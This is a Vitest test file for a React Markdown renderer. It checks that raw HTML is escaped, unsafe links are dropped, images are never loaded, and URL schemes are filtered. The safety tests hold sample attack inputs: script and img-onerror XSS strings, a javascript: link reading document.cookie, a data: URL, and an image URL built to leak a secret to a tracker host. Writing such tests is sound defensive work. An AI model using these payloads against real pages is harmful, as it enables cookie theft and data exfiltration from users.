import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { Markdown } from './markdown'
import { lexBlocks, safeUrl } from './markdown-utils'

const render = (text: string) => renderToStaticMarkup(<Markdown text={text} />)

describe('Markdown output safety', () => {
  it('shows raw HTML as text instead of creating elements', () => {
    const html = render('Before\n\n<img src="x" onerror="alert(1)"> <script>alert(1)</script>\n\nAfter <b>bold</b>')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('<b>')
    expect(html).toContain('&lt;script&gt;')
    expect(html).toContain('&lt;img src=&quot;x&quot; onerror=&quot;alert(1)&quot;&gt;')
  })

  it('drops javascript: and data: links but keeps their text', () => {
    const html = render('[run](javascript:alert(document.cookie)) and [data](data:text/html;base64,PHNjcmlwdD4=)')
    expect(html).not.toContain('href="javascript')
    expect(html).not.toContain('href="data')
    expect(html).toContain('run')
    expect(html).toContain('Link removed')
  })

  it('renders http links with a safe rel, a new tab and their real host', () => {
    const html = render('[docs](https://developer.mozilla.org/en-US/)')
    expect(html).toContain('href="https://developer.mozilla.org/en-US/"')
    expect(html).toContain('rel="noopener noreferrer nofollow ugc"')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('(developer.mozilla.org)')
  })

  it('never loads images, which could exfiltrate data through the URL', () => {
    const html = render('![badge](https://tracker.example.com/p.png?leak=secret)')
    expect(html).not.toContain('<img')
    expect(html).toContain('Image not loaded: badge (tracker.example.com)')
  })
})

describe('Markdown structure', () => {
  it('renders code blocks with their language and literal content', () => {
    const html = render('```ts\nif (a < b) { run() }\n```')
    expect(html).toContain('ts')
    expect(html).toContain('if (a &lt; b) { run() }')
  })

  it('renders GFM tables and task lists', () => {
    const html = render('| A | B |\n|---|---|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo')
    expect(html).toContain('<table>')
    expect(html).toContain('<td>1</td>')
    expect(html).toContain('type="checkbox"')
  })

  it('renders an unterminated code fence (mid-stream) as code', () => {
    const html = render('Here:\n\n```python\ndef f():\n    return 1')
    expect(html).toContain('python')
    expect(html).toContain('def f():')
  })
})

describe('lexBlocks', () => {
  it('keeps earlier blocks identical while the last one grows', () => {
    const before = lexBlocks('# Title\n\nFirst paragraph.\n\nSecond par')
    const after = lexBlocks('# Title\n\nFirst paragraph.\n\nSecond paragraph grows')
    expect(before.slice(0, -1).map((t) => t.raw)).toEqual(after.slice(0, -1).map((t) => t.raw))
    expect(before.at(-1)!.raw).not.toBe(after.at(-1)!.raw)
  })
})

describe('safeUrl', () => {
  it('accepts http, https and mailto only', () => {
    expect(safeUrl('https://a.example/x')?.host).toBe('a.example')
    expect(safeUrl('mailto:a@b.example')).not.toBeNull()
    expect(safeUrl('javascript:alert(1)')).toBeNull()
    expect(safeUrl('/relative/path')).toBeNull()
    expect(safeUrl('vbscript:x')).toBeNull()
  })
})
